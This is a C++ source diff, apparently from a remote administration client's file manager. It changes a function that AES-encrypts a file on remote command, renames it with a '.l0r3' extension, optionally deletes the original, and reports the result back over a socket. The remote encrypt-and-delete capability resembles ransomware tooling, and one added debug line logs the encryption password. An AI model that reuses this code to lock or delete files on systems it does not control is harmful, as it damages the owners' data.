@@ -316,6 +316,12 @@ void EditarArchivo(const std::string strPath, const std::string strID){
 }
 
 void Crypt_Archivo(std::string strPath, const char cCryptOption, const char cDelOption, std::string strPass) {
+	std::string strComando = std::to_string(EnumComandos::FM_Crypt_Confirm);
+	strComando.append(1, CMD_DEL);
+	// 1 = No se pudo abrir archivo entrada
+	// 2 = ""  "" ""   ""    ""      salida
+	// 3 = success
+
 	ByteArray bKey;
 	ByteArray bOutput;
 	ByteArray::size_type out_len;
@@ -328,10 +334,9 @@ void Crypt_Archivo(std::string strPath, const char cCryptOption, const char cDel
 
 	std::ifstream archivo(strPath, std::ios::binary);
 	if (!archivo.is_open()) {
-#ifdef ___DEBUG_
-		error();
-		std::cout << "Error abriendo el archivo " << strPath << std::endl;
-#endif
+		DebugPrint("[CRYPT] ERR IN " + strPass);
+		strComando.append(1, '1');
+		cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false);
 		return;
 	}
 
@@ -346,10 +351,6 @@ void Crypt_Archivo(std::string strPath, const char cCryptOption, const char cDel
 		out_len = Aes256::decrypt(bKey, reinterpret_cast<unsigned char*>(cBuffer), uFileSize, bOutput);
 	}
 
-#ifdef ___DEBUG_
-	std::cout << "[CRYPT] Out: " << out_len << std::endl;
-#endif
-
 	archivo.close();
 
 	std::string strOut = (cCryptOption == '0') ? strPath + ".l0r3" : strPath.substr(0, strPath.size() - 5);
@@ -357,14 +358,12 @@ void Crypt_Archivo(std::string strPath, const char cCryptOption, const char cDel
 	std::ofstream archivo_out(strOut, std::ios::binary);
 
 	if (archivo_out.is_open()) {
-		//archivo_out.write(cBuffer, out_len);
 		archivo_out.write(reinterpret_cast<const char*>(bOutput.data()), out_len);
 		archivo_out.close();
+		strComando.append(1, '3');
 	}else {
-#ifdef ___DEBUG_
-		error();
-		std::cout << "Error abriendo el archivo " << strOut << std::endl;
-#endif
+		DebugPrint("[CRYPT] ERR OUT " + strOut);
+		strComando.append(1, '2');
 	}
 
 	if (cBuffer) {
@@ -375,4 +374,6 @@ void Crypt_Archivo(std::string strPath, const char cCryptOption, const char cDel
 	if (cDelOption == '1') {
 		BorrarArchivo(strPath.c_str());
 	}
+
+	cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false);
 }
